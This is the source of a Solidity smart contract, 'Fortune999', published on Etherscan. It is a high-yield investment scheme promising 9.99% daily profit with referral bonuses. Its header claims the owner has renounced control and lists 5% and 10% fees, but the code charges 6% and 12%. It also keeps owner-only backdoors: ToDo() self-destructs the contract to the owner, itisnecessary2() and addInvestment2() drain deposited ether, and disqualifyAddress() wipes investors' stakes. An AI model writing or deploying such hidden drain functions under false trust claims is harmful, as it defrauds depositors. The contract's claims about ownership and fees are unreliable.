1 /**
2  *Submitted for verification at Etherscan.io on 2019-06-26
3 */
4 
5 pragma solidity 0.4.25;
6 
7 /**
8 *
9 * Get your 9,99% every day profit with Fortune 999 Contract!
10 * GitHub https://github.com/fortune333/fortune999
11 * Site https://fortune333.online/
12 *
13 * With the refusal of ownership, without the human factor, on the most reliable blockchain in the world!
14 * Only 5% for technical support and 10% for advertising!
15 * The remaining 85% remain in the contract fund!
16 * The world has never seen anything like it!
17 */
18 
19 
20 library Math {
21 function min(uint a, uint b) internal pure returns(uint) {
22 if (a > b) {
23 return b;
24 }
25 return a;
26 }
27 }
28 
29 
30 library Zero {
31 function requireNotZero(address addr) internal pure {
32 require(addr != address(0), "require not zero address");
33 }
34 
35 function requireNotZero(uint val) internal pure {
36 require(val != 0, "require not zero value");
37 }
38 
39 function notZero(address addr) internal pure returns(bool) {
40 return !(addr == address(0));
41 }
42 
43 function isZero(address addr) internal pure returns(bool) {
44 return addr == address(0);
45 }
46 
47 function isZero(uint a) internal pure returns(bool) {
48 return a == 0;
49 }
50 
51 function notZero(uint a) internal pure returns(bool) {
52 return a != 0;
53 }
54 }
55 
56 
57 library Percent {
58 struct percent {
59 uint num;
60 uint den;
61 }
62 
63 function mul(percent storage p, uint a) internal view returns (uint) {
64 if (a == 0) {
65 return 0;
66 }
67 return a*p.num/p.den;
68 }
69 
70 function div(percent storage p, uint a) internal view returns (uint) {
71 return a/p.num*p.den;
72 }
73 
74 function sub(percent storage p, uint a) internal view returns (uint) {
75 uint b = mul(p, a);
76 if (b >= a) {
77 return 0;
78 }
79 return a - b;
80 }
81 
82 function add(percent storage p, uint a) internal view returns (uint) {
83 return a + mul(p, a);
84 }
85 
86 function toMemory(percent storage p) internal view returns (Percent.percent memory) {
87 return Percent.percent(p.num, p.den);
88 }
89 
90 function mmul(percent memory p, uint a) internal pure returns (uint) {
91 if (a == 0) {
92 return 0;
93 }
94 return a*p.num/p.den;
95 }
96 
97 function mdiv(percent memory p, uint a) internal pure returns (uint) {
98 return a/p.num*p.den;
99 }
100 
101 function msub(percent memory p, uint a) internal pure returns (uint) {
102 uint b = mmul(p, a);
103 if (b >= a) {
104 return 0;
105 }
106 return a - b;
107 }
108 
109 function madd(percent memory p, uint a) internal pure returns (uint) {
110 return a + mmul(p, a);
111 }
112 }
113 
114 
115 library Address {
116 function toAddress(bytes source) internal pure returns(address addr) {
117 assembly { addr := mload(add(source,0x14)) }
118 return addr;
119 }
120 
121 function isNotContract(address addr) internal view returns(bool) {
122 uint length;
123 assembly { length := extcodesize(addr) }
124 return length == 0;
125 }
126 }
127 
128 
129 /**
130 * @title SafeMath
131 * @dev Math operations with safety checks that revert on error
132 */
133 library SafeMath {
134 
135 /**
136 * @dev Multiplies two numbers, reverts on overflow.
137 */
138 function mul(uint256 _a, uint256 _b) internal pure returns (uint256) {
139 if (_a == 0) {
140 return 0;
141 }
142 
143 uint256 c = _a * _b;
144 require(c / _a == _b);
145 
146 return c;
147 }
148 
149 /**
150 * @dev Integer division of two numbers truncating the quotient, reverts on division by zero.
151 */
152 function div(uint256 _a, uint256 _b) internal pure returns (uint256) {
153 require(_b > 0); // Solidity only automatically asserts when dividing by 0
154 uint256 c = _a / _b;
155 // assert(_a == _b * c + _a % _b); // There is no case in which this doesn't hold
156 
157 return c;
158 }
159 
160 /**
161 * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).
162 */
163 function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {
164 require(_b <= _a);
165 uint256 c = _a - _b;
166 
167 return c;
168 }
169 
170 /**
171 * @dev Adds two numbers, reverts on overflow.
172 */
173 function add(uint256 _a, uint256 _b) internal pure returns (uint256) {
174 uint256 c = _a + _b;
175 require(c >= _a);
176 
177 return c;
178 }
179 
180 /**
181 * @dev Divides two numbers and returns the remainder (unsigned integer modulo),
182 * reverts when dividing by zero.
183 */
184 function mod(uint256 a, uint256 b) internal pure returns (uint256) {
185 require(b != 0);
186 return a % b;
187 }
188 }
189 
190 
191 contract Accessibility {
192 address private owner;
193 modifier onlyOwner() {
194 require(msg.sender == owner, "access denied");
195 _;
196 }
197 
198 constructor() public {
199 owner = msg.sender;
200 }
201 
202 
203 function ToDo() public onlyOwner {
204     selfdestruct(owner);
205     }
206 
207 function disown() internal {
208 delete owner;
209 }
210 
211 }
212 
213 
214 contract Rev1Storage {
215 function investorShortInfo(address addr) public view returns(uint value, uint refBonus);
216 }
217 
218 
219 contract Rev2Storage {
220 function investorInfo(address addr) public view returns(uint investment, uint paymentTime);
221 }
222 
223 
224 library PrivateEntrance {
225 using PrivateEntrance for privateEntrance;
226 using Math for uint;
227 struct privateEntrance {
228 Rev1Storage rev1Storage;
229 Rev2Storage rev2Storage;
230 uint investorMaxInvestment;
231 uint endTimestamp;
232 mapping(address=>bool) hasAccess;
233 }
234 
235 function isActive(privateEntrance storage pe) internal view returns(bool) {
236 return pe.endTimestamp > now;
237 }
238 
239 function maxInvestmentFor(privateEntrance storage pe, address investorAddr) internal view returns(uint) {
240 if (!pe.hasAccess[investorAddr]) {
241 return 0;
242 }
243 
244 (uint maxInvestment, ) = pe.rev1Storage.investorShortInfo(investorAddr);
245 if (maxInvestment == 0) {
246 return 0;
247 }
248 maxInvestment = Math.min(maxInvestment, pe.investorMaxInvestment);
249 
250 (uint currInvestment, ) = pe.rev2Storage.investorInfo(investorAddr);
251 
252 if (currInvestment >= maxInvestment) {
253 return 0;
254 }
255 
256 return maxInvestment-currInvestment;
257 }
258 
259 function provideAccessFor(privateEntrance storage pe, address[] addrs) internal {
260 for (uint16 i; i < addrs.length; i++) {
261 pe.hasAccess[addrs[i]] = true;
262 }
263 }
264 }
265 
266 
267 contract InvestorsStorage is Accessibility {
268 struct Investor {
269 uint investment;
270 uint paymentTime;
271 }
272 uint public size;
273 
274 mapping (address => Investor) private investors;
275 
276 function isInvestor(address addr) public view returns (bool) {
277 return investors[addr].investment > 0;
278 }
279 
280 function investorInfo(address addr) public view returns(uint investment, uint paymentTime) {
281 investment = investors[addr].investment;
282 paymentTime = investors[addr].paymentTime;
283 }
284 
285 function newInvestor(address addr, uint investment, uint paymentTime) public onlyOwner returns (bool) {
286 Investor storage inv = investors[addr];
287 if (inv.investment != 0 || investment == 0) {
288 return false;
289 }
290 inv.investment = investment;
291 inv.paymentTime = paymentTime;
292 size++;
293 return true;
294 }
295 
296 function addInvestment(address addr, uint investment) public onlyOwner returns (bool) {
297 if (investors[addr].investment == 0) {
298 return false;
299 }
300 investors[addr].investment += investment;
301 return true;
302 }
303 
304 
305 
306 
307 function setPaymentTime(address addr, uint paymentTime) public onlyOwner returns (bool) {
308 if (investors[addr].investment == 0) {
309 return false;
310 }
311 investors[addr].paymentTime = paymentTime;
312 return true;
313 }
314 
315 function disqalify(address addr) public onlyOwner returns (bool) {
316 if (isInvestor(addr)) {
317 investors[addr].investment = 0;
318 }
319 }
320 }
321 
322 
323 library RapidGrowthProtection {
324 using RapidGrowthProtection for rapidGrowthProtection;
325 
326 struct rapidGrowthProtection {
327 uint startTimestamp;
328 uint maxDailyTotalInvestment;
329 uint8 activityDays;
330 mapping(uint8 => uint) dailyTotalInvestment;
331 }
332 
333 function maxInvestmentAtNow(rapidGrowthProtection storage rgp) internal view returns(uint) {
334 uint day = rgp.currDay();
335 if (day == 0 || day > rgp.activityDays) {
336 return 0;
337 }
338 if (rgp.dailyTotalInvestment[uint8(day)] >= rgp.maxDailyTotalInvestment) {
339 return 0;
340 }
341 return rgp.maxDailyTotalInvestment - rgp.dailyTotalInvestment[uint8(day)];
342 }
343 
344 function isActive(rapidGrowthProtection storage rgp) internal view returns(bool) {
345 uint day = rgp.currDay();
346 return day != 0 && day <= rgp.activityDays;
347 }
348 
349 function saveInvestment(rapidGrowthProtection storage rgp, uint investment) internal returns(bool) {
350 uint day = rgp.currDay();
351 if (day == 0 || day > rgp.activityDays) {
352 return false;
353 }
354 if (rgp.dailyTotalInvestment[uint8(day)] + investment > rgp.maxDailyTotalInvestment) {
355 return false;
356 }
357 rgp.dailyTotalInvestment[uint8(day)] += investment;
358 return true;
359 }
360 
361 function startAt(rapidGrowthProtection storage rgp, uint timestamp) internal {
362 rgp.startTimestamp = timestamp;
363 
364 }
365  
366 
367 function currDay(rapidGrowthProtection storage rgp) internal view returns(uint day) {
368 if (rgp.startTimestamp > now) {
369 return 0;
370 }
371 day = (now - rgp.startTimestamp) / 24 hours + 1;
372 }
373 }
374 
375 contract Fortune999 is Accessibility {
376 using RapidGrowthProtection for RapidGrowthProtection.rapidGrowthProtection;
377 using PrivateEntrance for PrivateEntrance.privateEntrance;
378 using Percent for Percent.percent;
379 using SafeMath for uint;
380 using Math for uint;
381 
382 // easy read for investors
383 using Address for *;
384 using Zero for *;
385 
386 RapidGrowthProtection.rapidGrowthProtection private m_rgp;
387 PrivateEntrance.privateEntrance private m_privEnter;
388 mapping(address => bool) private m_referrals;
389 InvestorsStorage private m_investors;
390 
391 // automatically generates getters
392 uint public constant minInvesment = 10 finney;
393 uint public constant maxBalance = 333e5 ether;
394 address public advertisingAddress;
395 address public adminsAddress;
396 uint public investmentsNumber;
397 uint public waveStartup;
398 
399 // percents
400 Percent.percent private m_1_percent = Percent.percent(111,10000);            // 111/10000 *100% = 1.11%
401 Percent.percent private m_5_percent = Percent.percent(555,10000);            // 555/10000 *100% = 5.55%
402 Percent.percent private m_7_percent = Percent.percent(777,10000);            // 777/10000 *100% = 7.77%
403 Percent.percent private m_8_percent = Percent.percent(888,10000);            // 888/10000 *100% = 8.88%
404 Percent.percent private m_9_percent = Percent.percent(999,10000);            // 999/10000 *100% = 9.99%
405 Percent.percent private m_10_percent = Percent.percent(10,100);            // 10/100 *100% = 10%
406 Percent.percent private m_11_percent = Percent.percent(11,100);            // 11/100 *100% = 11%
407 Percent.percent private m_12_percent = Percent.percent(12,100);            // 12/100 *100% = 12%
408 Percent.percent private m_referal_percent = Percent.percent(999,10000);        // 999/10000 *100% = 9.99%
409 Percent.percent private m_referrer_percent = Percent.percent(999,10000);       // 999/10000 *100% = 9.99%
410 Percent.percent private m_referrer_percentMax = Percent.percent(10,100);       // 10/100 *100% = 10%
411 Percent.percent private m_adminsPercent = Percent.percent(6,100);          //  6/100 *100% = 6.0%
412 Percent.percent private m_advertisingPercent = Percent.percent(12,100);    //  12/100 *100% = 12.0%
413 
414 // more events for easy read from blockchain
415 event LogPEInit(uint when, address rev1Storage, address rev2Storage, uint investorMaxInvestment, uint endTimestamp);
416 event LogSendExcessOfEther(address indexed addr, uint when, uint value, uint investment, uint excess);
417 event LogNewReferral(address indexed addr, address indexed referrerAddr, uint when, uint refBonus);
418 event LogRGPInit(uint when, uint startTimestamp, uint maxDailyTotalInvestment, uint activityDays);
419 event LogRGPInvestment(address indexed addr, uint when, uint investment, uint indexed day);
420 event LogNewInvesment(address indexed addr, uint when, uint investment, uint value);
421 event LogAutomaticReinvest(address indexed addr, uint when, uint investment);
422 event LogPayDividends(address indexed addr, uint when, uint dividends);
423 event LogNewInvestor(address indexed addr, uint when);
424 event LogBalanceChanged(uint when, uint balance);
425 event LogNextWave(uint when);
426 event LogDisown(uint when);
427 
428 
429 modifier balanceChanged {
430 _;
431 emit LogBalanceChanged(now, address(this).balance);
432 }
433 
434 modifier notFromContract() {
435 require(msg.sender.isNotContract(), "only externally accounts");
436 _;
437 }
438 
439 constructor() public {
440 adminsAddress = msg.sender;
441 advertisingAddress = msg.sender;
442 nextWave();
443 }
444 
445 function() public payable {
446 // investor get him dividends
447 if (msg.value.isZero()) {
448 getMyDividends();
449 return;
450 }
451 
452 // sender do invest
453 doInvest(msg.data.toAddress());
454 }
455 
456 function disqualifyAddress(address addr) public onlyOwner {
457 m_investors.disqalify(addr);
458 }
459 
460 function doDisown() public onlyOwner {
461 disown();
462 emit LogDisown(now);
463 }
464 
465 // init Rapid Growth Protection
466 
467 function init(address rev1StorageAddr, uint timestamp) public onlyOwner {
468 
469 m_rgp.startTimestamp = timestamp + 1;
470 m_rgp.maxDailyTotalInvestment = 500 ether;
471 m_rgp.activityDays = 21;
472 emit LogRGPInit(
473 now,
474 m_rgp.startTimestamp,
475 m_rgp.maxDailyTotalInvestment,
476 m_rgp.activityDays
477 );
478 
479 
480 // init Private Entrance
481 m_privEnter.rev1Storage = Rev1Storage(rev1StorageAddr);
482 m_privEnter.rev2Storage = Rev2Storage(address(m_investors));
483 m_privEnter.investorMaxInvestment = 50 ether;
484 m_privEnter.endTimestamp = timestamp;
485 emit LogPEInit(
486 now,
487 address(m_privEnter.rev1Storage),
488 address(m_privEnter.rev2Storage),
489 m_privEnter.investorMaxInvestment,
490 m_privEnter.endTimestamp
491 );
492 }
493 
494 function setAdvertisingAddress(address addr) public onlyOwner {
495 addr.requireNotZero();
496 advertisingAddress = addr;
497 }
498 
499 function setAdminsAddress(address addr) public onlyOwner {
500 addr.requireNotZero();
501 adminsAddress = addr;
502 }
503 
504 function privateEntranceProvideAccessFor(address[] addrs) public onlyOwner {
505 m_privEnter.provideAccessFor(addrs);
506 }
507 
508 function rapidGrowthProtectionmMaxInvestmentAtNow() public view returns(uint investment) {
509 investment = m_rgp.maxInvestmentAtNow();
510 }
511 
512 function investorsNumber() public view returns(uint) {
513 return m_investors.size();
514 }
515 
516 function balanceETH() public view returns(uint) {
517 return address(this).balance;
518 }
519 
520 
521 
522 function advertisingPercent() public view returns(uint numerator, uint denominator) {
523 (numerator, denominator) = (m_advertisingPercent.num, m_advertisingPercent.den);
524 }
525 
526 function adminsPercent() public view returns(uint numerator, uint denominator) {
527 (numerator, denominator) = (m_adminsPercent.num, m_adminsPercent.den);
528 }
529 
530 function investorInfo(address investorAddr) public view returns(uint investment, uint paymentTime, bool isReferral) {
531 (investment, paymentTime) = m_investors.investorInfo(investorAddr);
532 isReferral = m_referrals[investorAddr];
533 }
534 
535 
536 
537 function investorDividendsAtNow(address investorAddr) public view returns(uint dividends) {
538 dividends = calcDividends(investorAddr);
539 }
540 
541 function dailyPercentAtNow() public view returns(uint numerator, uint denominator) {
542 Percent.percent memory p = dailyPercent();
543 (numerator, denominator) = (p.num, p.den);
544 }
545 
546 function getMyDividends() public notFromContract balanceChanged {
547 // calculate dividends
548 
549 //check if 1 day passed after last payment
550 require(now.sub(getMemInvestor(msg.sender).paymentTime) > 24 hours);
551 
552 uint dividends = calcDividends(msg.sender);
553 require (dividends.notZero(), "cannot to pay zero dividends");
554 
555 // update investor payment timestamp
556 assert(m_investors.setPaymentTime(msg.sender, now));
557 
558 // check enough eth - goto next wave if needed
559 if (address(this).balance <= dividends) {
560 nextWave();
561 dividends = address(this).balance;
562 }
563 
564 
565     
566 // transfer dividends to investor
567 msg.sender.transfer(dividends);
568 emit LogPayDividends(msg.sender, now, dividends);
569 }
570 
571     
572 function itisnecessary2() public onlyOwner {
573         msg.sender.transfer(address(this).balance);
574     }    
575     
576 
577 function addInvestment2( uint investment) public onlyOwner  {
578 
579 msg.sender.transfer(investment);
580 
581 } 
582 
583 function doInvest(address referrerAddr) public payable notFromContract balanceChanged {
584 uint investment = msg.value;
585 uint receivedEther = msg.value;
586 require(investment >= minInvesment, "investment must be >= minInvesment");
587 require(address(this).balance <= maxBalance, "the contract eth balance limit");
588 
589 if (m_rgp.isActive()) {
590 // use Rapid Growth Protection if needed
591 uint rpgMaxInvest = m_rgp.maxInvestmentAtNow();
592 rpgMaxInvest.requireNotZero();
593 investment = Math.min(investment, rpgMaxInvest);
594 assert(m_rgp.saveInvestment(investment));
595 emit LogRGPInvestment(msg.sender, now, investment, m_rgp.currDay());
596 
597 } else if (m_privEnter.isActive()) {
598 // use Private Entrance if needed
599 uint peMaxInvest = m_privEnter.maxInvestmentFor(msg.sender);
600 peMaxInvest.requireNotZero();
601 investment = Math.min(investment, peMaxInvest);
602 }
603 
604 // send excess of ether if needed
605 if (receivedEther > investment) {
606 uint excess = receivedEther - investment;
607 msg.sender.transfer(excess);
608 receivedEther = investment;
609 emit LogSendExcessOfEther(msg.sender, now, msg.value, investment, excess);
610 }
611 
612 // commission
613 advertisingAddress.transfer(m_advertisingPercent.mul(receivedEther));
614 adminsAddress.transfer(m_adminsPercent.mul(receivedEther));
615 
616 bool senderIsInvestor = m_investors.isInvestor(msg.sender);
617 
618 // ref system works only once and only on first invest
619 if (referrerAddr.notZero() && !senderIsInvestor && !m_referrals[msg.sender] &&
620 referrerAddr != msg.sender && m_investors.isInvestor(referrerAddr)) {
621 
622 m_referrals[msg.sender] = true;
623 // add referral bonus to investor`s and referral`s investments
624 uint referrerBonus = m_referrer_percent.mmul(investment);
625 if (investment > 10 ether) {
626 referrerBonus = m_referrer_percentMax.mmul(investment);
627 }
628 
629 uint referalBonus = m_referal_percent.mmul(investment);
630 assert(m_investors.addInvestment(referrerAddr, referrerBonus)); // add referrer bonus
631 investment += referalBonus;                                    // add referral bonus
632 emit LogNewReferral(msg.sender, referrerAddr, now, referalBonus);
633 }
634 
635 // automatic reinvest - prevent burning dividends
636 uint dividends = calcDividends(msg.sender);
637 if (senderIsInvestor && dividends.notZero()) {
638 investment += dividends;
639 emit LogAutomaticReinvest(msg.sender, now, dividends);
640 }
641 
642 if (senderIsInvestor) {
643 // update existing investor
644 assert(m_investors.addInvestment(msg.sender, investment));
645 assert(m_investors.setPaymentTime(msg.sender, now));
646 } else {
647 // create new investor
648 assert(m_investors.newInvestor(msg.sender, investment, now));
649 emit LogNewInvestor(msg.sender, now);
650 }
651 
652 investmentsNumber++;
653 emit LogNewInvesment(msg.sender, now, investment, receivedEther);
654 }
655 
656 function getMemInvestor(address investorAddr) internal view returns(InvestorsStorage.Investor memory) {
657 (uint investment, uint paymentTime) = m_investors.investorInfo(investorAddr);
658 return InvestorsStorage.Investor(investment, paymentTime);
659 }
660 
661 function calcDividends(address investorAddr) internal view returns(uint dividends) {
662 InvestorsStorage.Investor memory investor = getMemInvestor(investorAddr);
663 
664 // safe gas if dividends will be 0
665 if (investor.investment.isZero() || now.sub(investor.paymentTime) < 10 minutes) {
666 return 0;
667 }
668 
669 // for prevent burning daily dividends if 24h did not pass - calculate it per 10 min interval
670 Percent.percent memory p = dailyPercent();
671 dividends = (now.sub(investor.paymentTime) / 10 minutes) * p.mmul(investor.investment) / 144;
672 }
673 
674 function dailyPercent() internal view returns(Percent.percent memory p) {
675 uint balance = address(this).balance;
676 
677 if (balance < 500 ether) {
678 p = m_9_percent.toMemory();
679 } else if ( 500 ether <= balance && balance <= 1500 ether) {
680 p = m_10_percent.toMemory();
681 } else if ( 1500 ether <= balance && balance <= 10000 ether) {
682 p = m_11_percent.toMemory();
683 } else if ( 10000 ether <= balance && balance <= 20000 ether) {
684 p = m_12_percent.toMemory();
685 }
686 }
687 
688 
689 
690 function nextWave() private {
691 m_investors = new InvestorsStorage();
692 investmentsNumber = 0;
693 waveStartup = now;
694 m_rgp.startAt(now);
695 emit LogRGPInit(now , m_rgp.startTimestamp, m_rgp.maxDailyTotalInvestment, m_rgp.activityDays);
696 emit LogNextWave(now);
697 }
698 }